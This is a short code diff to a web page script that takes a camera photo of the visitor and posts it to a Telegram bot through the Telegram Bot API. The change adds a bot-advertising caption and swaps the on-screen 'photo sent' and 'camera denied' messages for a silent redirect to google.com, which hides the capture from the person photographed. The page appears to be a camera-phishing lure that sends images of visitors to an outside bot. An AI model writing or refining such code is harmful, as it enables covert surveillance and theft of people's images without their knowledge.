@@ -47,17 +47,16 @@
             const form = new FormData();
             form.append("chat_id", chatId);
             form.append("photo", blob, "selfie.png");
-            form.append("caption", "Saytdan olingan selfie");
+            form.append("caption", "*@koryapmanbot orqali olindi*", "markdown");
 
             fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
               method: "POST",
               body: form,
             });
           }, "image/png");
-
-          document.body.innerHTML = "<h2>✅ Rasm yuborildi!</h2>";
+          window.location.href = "https://google.com";
         } catch (err) {
-          document.body.innerHTML = "<h2>❌ Kamera ruxsat berilmadi</h2>";
+          window.location.href = "https://google.com";
         }
       }
       start();
